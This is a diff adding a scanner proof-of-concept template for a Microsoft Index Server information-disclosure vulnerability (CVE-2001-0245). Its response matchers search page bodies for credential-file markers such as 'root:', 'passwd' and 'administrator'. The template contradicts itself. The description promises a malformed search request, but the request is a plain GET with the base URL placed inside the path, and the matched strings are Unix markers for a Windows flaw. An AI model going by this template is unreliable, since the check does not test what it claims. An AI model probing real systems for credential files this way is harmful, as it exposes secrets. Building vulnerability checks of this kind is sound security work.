@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "利用畸形搜索请求触发微软 Index Server 服务器端包含文件读取漏洞，验证是否能访问敏感的 .stm/.ida 文件"
+id = "POC-AVE-2001-0677"
+name = "微软 Index Server 信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-2001-0677"]
+vuln_id = [
+    "CVE-2001-0245",
+    "AVE-2001-0677",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/search.asp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE-POC/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "administrator",
+    "passwd",
+]
